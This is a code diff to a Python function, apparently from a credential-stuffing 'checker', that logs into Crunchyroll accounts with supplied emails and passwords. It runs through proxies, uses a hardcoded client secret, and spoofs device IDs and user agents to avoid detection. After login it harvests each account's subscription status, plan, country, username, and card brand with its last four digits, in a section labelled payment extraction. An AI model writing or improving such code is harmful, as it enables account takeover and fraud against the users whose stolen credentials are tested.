@@ -1330,16 +1330,16 @@ def check_crunchyroll(email, password, proxy=None):
     }
 
     proxies = {'http': proxy, 'https': proxy} if proxy else None
-    max_retries = 3
-
-    CLIENT_ID = "y2arvjb0h0rgvtizlovy"
-    CLIENT_SECRET = "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2"
+    max_retries = 4
 
     for attempt in range(max_retries):
         try:
-            device_id = str(uuid.uuid4())
+            device_id, _, _ = generate_random_device_info()
+            user_agent = generate_random_user_agent()
 
             # ====================== LOGIN ======================
+            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
+            
             token_data = {
                 "grant_type": "password",
                 "username": email,
@@ -1347,27 +1347,21 @@ def check_crunchyroll(email, password, proxy=None):
                 "scope": "offline_access",
                 "client_id": "y2arvjb0h0rgvtizlovy",
                 "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
-                "device_type": "AppleTV",
+                "device_type": "SamsungTV",
                 "device_id": device_id,
-                "device_name": "AppleTV"
+                "device_name": "Goku"
             }
 
             headers = {
-                "User-Agent": "AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)",
-                "Host": "beta-api.crunchyroll.com"
+                "host": "beta-api.crunchyroll.com",
+                "x-datadog-sampling-priority": "0",
+                "etp-anonymous-id": device_id,
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": user_agent,
+                "accept-encoding": "gzip"
             }
 
-            resp = requests.post(
-                "https://beta-api.crunchyroll.com/auth/v1/token",
-                data=token_data,
-                headers=headers,
-                # ← NO auth= parameter here
-                proxies=proxies,
-                timeout=20
-            )
-
-            # ADD THIS LINE temporarily
-            print(f"[DEBUG] Status: {resp.status_code} | Body: {resp.text[:300]}")
+            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
 
             if resp.status_code == 200:
                 access_token = resp.json().get('access_token')
@@ -1386,13 +1380,16 @@ def check_crunchyroll(email, password, proxy=None):
                 result['message'] = f"Login failed (HTTP {resp.status_code})"
                 return result
 
-            # Reuse same headers, just add the token
-            headers["Authorization"] = f"Bearer {access_token}"
+            acc_headers = {
+                'Authorization': f'Bearer {access_token}',
+                'User-Agent': user_agent,
+                'etp-anonymous-id': str(uuid.uuid4()),
+                'x-datadog-sampling-priority': '0',
+                'accept-encoding': 'gzip'
+            }
 
-            acc_resp = requests.get(
-                "https://beta-api.crunchyroll.com/accounts/v1/me",
-                headers=headers, proxies=proxies, timeout=25
-            )
+            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
+                                  headers=acc_headers, proxies=proxies, timeout=25)
 
             if acc_resp.status_code == 200:
                 acc_data = acc_resp.json()
@@ -1403,10 +1400,8 @@ def check_crunchyroll(email, password, proxy=None):
 
                 if external_id:
                     # Subscription
-                    subs_resp = requests.get(
-                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
-                        headers=headers, proxies=proxies, timeout=25
-                    )
+                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
+                                           headers=acc_headers, proxies=proxies, timeout=25)
                     if subs_resp.status_code == 200:
                         subs_data = subs_resp.json()
                         result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
@@ -1414,10 +1409,8 @@ def check_crunchyroll(email, password, proxy=None):
                         result['country'] = subs_data.get('country_code', 'ZZ')
 
                     # Products
-                    prod_resp = requests.get(
-                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
-                        headers=headers, proxies=proxies, timeout=25
-                    )
+                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
+                                           headers=acc_headers, proxies=proxies, timeout=25)
                     if prod_resp.status_code == 200:
                         items = prod_resp.json().get('items', [])
                         if items:
@@ -1427,7 +1420,7 @@ def check_crunchyroll(email, password, proxy=None):
                             result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                             result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'
 
-                    # ================== PAYMENT EXTRACTION ==================
+                    # ================== IMPROVED PAYMENT EXTRACTION v3 ==================
                     payment_method = "Unknown"
                     card_brand = ""
                     last4 = ""
@@ -1453,19 +1446,23 @@ def check_crunchyroll(email, password, proxy=None):
                             for item in data:
                                 find_payment_info(item)
 
+                    # Check benefits
                     benefits_resp = requests.get(
                         f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
-                        headers=headers, proxies=proxies, timeout=25
+                        headers=acc_headers, proxies=proxies, timeout=25
                     )
                     if benefits_resp.status_code == 200:
                         try:
-                            find_payment_info(benefits_resp.json())
+                            benefits_json = benefits_resp.json()
+                            find_payment_info(benefits_json)
                         except:
                             pass
 
+                    # Check products (very important for payment info)
                     if prod_resp.status_code == 200:
                         try:
-                            find_payment_info(prod_resp.json())
+                            prod_json = prod_resp.json()
+                            find_payment_info(prod_json)
                         except:
                             pass
 
@@ -1486,12 +1483,14 @@ def check_crunchyroll(email, password, proxy=None):
                             if match:
                                 payment_method = match.group(0).capitalize()
 
+                    # Final payment result
                     if card_brand and last4:
                         result['payment_method'] = f"{card_brand} •••• {last4}"
                     elif payment_method != "Unknown":
                         result['payment_method'] = payment_method
                     else:
                         result['payment_method'] = "Unknown / Third-party"
+                    # ====================================================================
 
                     # Plan & Max Streams (kept from your original code)
                     if benefits_resp.status_code == 200:
@@ -1513,12 +1512,11 @@ def check_crunchyroll(email, password, proxy=None):
                                 result['max_streams'] = streams
 
             # Username
-            profile_resp = requests.get(
-                "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
-                headers=headers, proxies=proxies, timeout=25
-            )
+            profile_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
+                                      headers=acc_headers, proxies=proxies, timeout=25)
             if profile_resp.status_code == 200:
-                username_match = re.search(r'"username":"(.*?)"', profile_resp.text)
+                profile_data = profile_resp.text
+                username_match = re.search(r'"username":"(.*?)"', profile_data)
                 if username_match:
                     result['username'] = username_match.group(1)
 
@@ -1535,7 +1533,7 @@ def check_crunchyroll(email, password, proxy=None):
             if attempt < max_retries - 1:
                 time.sleep(2 ** attempt + random.uniform(0.5, 2))
                 continue
-            result['message'] = f'Error: {str(e)[:100]}'
+            result['message'] = f'Error: {str(e)[:80]}'
             return result
 
     return result
